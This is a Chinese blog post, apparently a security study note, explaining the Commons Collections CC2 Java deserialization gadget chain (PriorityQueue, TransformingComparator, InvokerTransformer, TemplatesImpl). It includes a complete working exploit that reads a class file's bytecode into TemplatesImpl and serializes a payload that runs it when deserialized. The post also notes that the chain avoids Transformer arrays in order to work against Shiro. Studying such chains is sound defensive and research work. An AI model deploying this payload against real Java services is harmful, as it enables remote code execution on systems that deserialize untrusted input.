---
title: java反序列化之CC2
date: 2026-05-18
tags: 
  - java安全
  - 反序列化专题
  - CC链
categories: 
  - web安全
  - java安全
excerpt: java反序列化之CC2
---

# java反序列化之CC2

## CC2 链分析

CC2 这条链子是在 CC4 的基础上修改了一部分，主要是为了避免使用`Transformer`数组。

在 CC4 的基础上，抛弃了用`InstantiateTransformer`类将`TrAXFilter`初始化，以及 `TemplatesImpl.newTransformer()` 这个步骤。

CC2 的前半部分，还是和`compare()`方法相关，最后是`TemplatesImpl`动态加载字节码，和 CC4 最后部分是一样的。而难点就在`InvokerTransformer`的连接。

## EXP 编写

先回顾一下调用链：

1. 入口类我们选择`PriorityQueue`，因为这个类实现了`java.io.Serializable`接口，也有重写的`readObject`方法，在`readObject`方法中调用了`PriorityQueue.heapify()`，`heapify()`方法中调用了`PriorityQueue.siftDown()`方法，`siftDown()`方法中调用了`PriorityQueue.siftDownUsingComparator()`方法，`siftDownUsingComparator()`方法中会调用`comparator`属性的`compare()`方法。

2. 此时我们把`comparator`属性初始化为`TransformingComparator`对象，就会调用`TransformingComparator`对象的`compare()`方法，`compare()`方法中会调用`transformer`属性的`transform()`方法，`transformer`属性是在我们实例化这个类的时候传的参数赋值的，所以我们传一个`InvokerTransformer`对象，就会调用`transform`方法实现反射调用任意类。

   但目前有一个问题，调用`InvokerTransformer.transform()`传的参数要是我们实例化的`TemplatesImpl`，但是是怎么把这个参数传递进去的？在 CC4 中分析过，我们要对`priorityQueue`这个对象`add`两次才能运行，这里关键就在于这个`add`。
   在 CC4 中也分析过，调用`add`方法也会触发`compare()`方法，这样就会导致没有进行序列化时就加载了字节码。所以我们会先把`TransformingComparator`的`transformer`属性设置为一个无关值，等`add`完之后在反射改回来。同时，如果我们`add(templates)`两次，这样不仅能够进入循环，还能把`templates`传入`compare()`方法，从而实现调用到`InvokerTransformer.transform(templates)`。

3. 这样就进入`InvokerTransformer`的反射调用环节，如果我们想要动态加载字节码，此时需要调用`templates`的`newTransformer`方法，我们把`newTransformer`方法放到`InvokerTransformer.transform()`方法中去就能实现。

### 完整EXP

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class test {

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("D:\\java安全学习过程中的测试代码\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);

        Class<? extends TransformingComparator> c = transformingComparator.getClass();
        Field transformer = c.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator,invokerTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }
}
```

## 总结

CC 链直接差别都不大，前面的学懂了后面的链子很容易上手。

CC2 和别的链子的差别就是没有`Transformer` 数组，不用数组是因为比如 shiro 当中的漏洞，它会重写很多动态加载数组的方法，这就可能会导致我们的 EXP 无法通过数组实现。





























